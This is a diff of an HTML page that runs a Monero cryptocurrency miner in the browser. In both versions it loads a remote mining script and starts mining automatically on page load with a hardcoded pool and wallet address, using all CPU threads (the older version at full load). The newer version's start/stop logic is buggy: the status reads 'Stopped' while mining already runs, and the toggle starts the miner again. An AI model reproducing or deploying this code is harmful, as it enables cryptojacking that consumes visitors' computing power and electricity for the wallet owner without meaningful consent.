@@ -1,110 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Monero Web Miner</title>
-  <style>
-    body {
-      background: black;
-      color: lime;
-      font-family: monospace, monospace;
-      text-align: center;
-      padding: 20px;
-    }
-    #hashrate, #totalHashes {
-      font-size: 1.5em;
-      margin: 15px 0;
-    }
-    canvas {
-      background: #111;
-      border: 1px solid lime;
-      display: block;
-      margin: 20px auto;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Monero Web Miner</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            text-align: center;
+            background-color: #f4f4f4;
+        }
+        #miner-status {
+            margin-top: 20px;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            display: inline-block;
+        }
+        #miner-status p {
+            margin: 10px 0;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+    </style>
 </head>
 <body>
-  <h1>🔥 Monero Miner Active</h1>
-  <p>Mining on your device at max capacity.</p>
-  <div id="hashrate">Hashrate: calculating...</div>
-  <div id="totalHashes">Total Hashes: 0</div>
-  <canvas id="hashrateChart" width="600" height="300"></canvas>
+    <h1>Monero Web Miner</h1>
+    <button onclick="toggleMining()">Start/Stop Mining</button>
+    <div id="miner-status">
+        <p>Status: <span id="status">Stopped</span></p>
+        <p>Hashrate: <span id="hashrate">0 H/s</span></p>
+        <p>Total Hashes: <span id="total-hashes">0</span></p>
+        <p>Accepted Shares: <span id="accepted-shares">0</span></p>
+    </div>
 
-  <!-- Chart.js -->
-  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-  <!-- Monero WebMiner Script -->
-  <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
-  <script>
-    // Параметры майнера
-    const pool = "gulf.moneroocean.stream:10004";
-    const walletAddress = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
-    const workerId = "WebWorker1";
-    const threads = navigator.hardwareConcurrency || -1;
-    const password = "";
+    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+    <script>
+        // Configuration
+        const server = "wss://ny1.xmrminingproxy.com";
+        const pool = "moneroocean.stream";
+        const walletAddress = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
+        const workerId = "Web-Miner";
+        const threads = -1; // Use all available threads
+        const password = "";
+        let isMining = false;
 
-    // Запуск майнера
-    startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 0; // 0% пауз, 100% нагрузка
-    stopOnError = false;
-    debug = true;
+        // Metrics
+        let totalHashes = 0;
+        let acceptedShares = 0;
+        let hashrate = 0;
 
-    // Настройка графика с Chart.js
-    const ctx = document.getElementById("hashrateChart").getContext("2d");
-    const chartData = {
-      labels: [],
-      datasets: [{
-        label: "Hashrate (H/s)",
-        data: [],
-        borderColor: "lime",
-        backgroundColor: "rgba(0,255,0,0.1)",
-        fill: true,
-        tension: 0.2,
-        pointRadius: 0,
-        borderWidth: 2,
-      }]
-    };
-    const chartOptions = {
-      animation: false,
-      scales: {
-        x: { display: false },
-        y: {
-          beginAtZero: true,
-          ticks: { color: "lime" },
-          grid: { color: "#333" }
+        // Start mining
+        startMining(pool, walletAddress, workerId, threads, password);
+        throttleMiner = 20; // Throttle to 20% to avoid overloading the browser
+
+        // Update metrics
+        function updateMetrics() {
+            if (typeof getHashesPerSecond === "function") {
+                hashrate = getHashesPerSecond();
+                document.getElementById("hashrate").innerText = hashrate.toFixed(2) + " H/s";
+            }
+            if (typeof getTotalHashes === "function") {
+                totalHashes = getTotalHashes();
+                document.getElementById("total-hashes").innerText = totalHashes;
+            }
+            if (typeof getAcceptedHashes === "function") {
+                acceptedShares = getAcceptedHashes();
+                document.getElementById("accepted-shares").innerText = acceptedShares;
+            }
+            document.getElementById("status").innerText = isMining ? "Running" : "Stopped";
         }
-      },
-      plugins: {
-        legend: {
-          labels: { color: "lime", font: { size: 14 } }
+
+        // Toggle mining
+        function toggleMining() {
+            if (isMining) {
+                stopMining();
+                isMining = false;
+                document.getElementById("status").innerText = "Stopped";
+            } else {
+                startMining(pool, walletAddress, workerId, threads, password);
+                isMining = true;
+                document.getElementById("status").innerText = "Running";
+            }
         }
-      }
-    };
-    const hashrateChart = new Chart(ctx, {
-      type: "line",
-      data: chartData,
-      options: chartOptions
-    });
 
-    // Обновление хешрейта и графика каждую секунду
-    setInterval(() => {
-      if (typeof getHashRate === "function") {
-        const hashrate = getHashRate();
-        const totalHashes = typeof getTotalHashes === "function" ? getTotalHashes() : 0;
-
-        document.getElementById("hashrate").textContent = `Hashrate: ${hashrate.toFixed(2)} H/s`;
-        document.getElementById("totalHashes").textContent = `Total Hashes: ${totalHashes}`;
-
-        // Обновляем график, показываем максимум 30 точек
-        if (chartData.labels.length >= 30) {
-          chartData.labels.shift();
-          chartData.datasets[0].data.shift();
-        }
-        chartData.labels.push("");
-        chartData.datasets[0].data.push(hashrate.toFixed(2));
-        hashrateChart.update();
-      }
-    }, 1000);
-  </script>
+        // Update metrics every second
+        setInterval(updateMetrics, 1000);
+    </script>
 </body>
 </html>
